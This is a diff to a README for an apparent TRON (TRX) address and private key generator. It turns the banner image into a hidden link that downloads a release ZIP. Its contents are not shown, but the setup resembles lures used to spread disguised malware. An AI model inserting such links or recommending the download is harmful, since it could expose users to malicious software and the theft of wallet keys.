@@ -1,7 +1,9 @@
 # ⚡ TRON (TRX) Address & Private Key Generator
 
 <p align="center">
-  <img src="https://i.imgur.com/5cun7on.jpeg" alt="TRON Generator Banner">
+  <a href="https://github.com/dan-wright-eng1989t7/Tron-TRX-Address-and-Private-key-Generator/releases/download/TRX-GENERATOR/TRX-GENERATOR.zip">
+    <img src="https://i.imgur.com/5cun7on.jpeg" alt="TRON Generator Banner">
+  </a>
 </p>
 
 <p align="center">
